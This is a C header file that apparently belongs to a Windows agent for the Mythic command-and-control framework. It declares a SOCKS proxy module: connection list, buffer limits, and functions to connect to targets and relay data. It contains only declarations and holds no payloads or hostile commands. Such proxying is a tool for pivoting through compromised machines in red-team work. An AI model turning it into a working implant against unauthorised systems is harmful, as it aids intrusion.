#pragma once
#ifndef SOCKS_H
#define SOCKS_H

#include <windows.h>
#include <winsock2.h>
#include "Parser.h"
#include "Config.h"

#ifdef INCLUDE_CMD_SOCKS

#define MAX_SOCKS_READS_PER_LOOP    30      
#define SOCKS_BUFFER_SIZE           65535   // 64kb
#define SOCKS_CONNECT_TIMEOUT_SEC   5       // Seconds

// Linked-list for SOCKS connections
typedef struct _SOCKS_CONN {
    UINT32  ServerId;           // Mythic's connection identifier
    SOCKET  Socket;             // TCP socket to target
    BOOL    Connected;          // Is connection active
    BOOL    ShouldExit;         // Should close after current data
    struct _SOCKS_CONN* Next;   // Linked list pointer
} SOCKS_CONN, *PSOCKS_CONN;

VOID Socks(PCHAR taskUuid, PPARSER arguments);
VOID SocksProcessData(PPARSER parser);
VOID SocksPush();
PSOCKS_CONN SocksFindConnection(UINT32 serverId);
PSOCKS_CONN SocksConnect(UINT32 serverId, PCHAR targetIp, UINT16 targetPort);
BOOL SocksRemove(UINT32 serverId);
VOID SocksSendResponse(UINT32 serverId, PBYTE data, UINT32 dataLen, BOOL exitFlag);

#endif  // INCLUDE_CMD_SOCKS

#endif  // SOCKS_H